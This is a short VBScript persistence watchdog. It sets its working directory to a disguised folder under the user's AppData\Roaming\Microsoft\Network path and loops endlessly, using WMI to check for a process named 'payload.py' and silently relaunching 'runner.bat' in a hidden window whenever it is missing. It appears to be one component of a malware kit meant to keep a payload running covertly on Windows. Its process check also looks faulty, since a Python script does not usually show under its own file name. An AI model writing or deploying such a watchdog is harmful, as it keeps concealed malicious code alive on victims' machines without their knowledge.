Set ws = CreateObject("Wscript.Shell")
Set wmi = GetObject("winmgmts:\\.\root\cimv2")

ws.CurrentDirectory = "C:\Users\" & ws.ExpandEnvironmentStrings("%USERNAME%") & "\AppData\Roaming\Microsoft\Network\runtime"

Do While True
    Set processes = wmi.ExecQuery("Select * from Win32_Process Where Name = 'payload.py'")
    
    If processes.Count = 0 Then
        ws.Run "runner.bat", 0, True
    End If
    
    WScript.Sleep 3000
Loop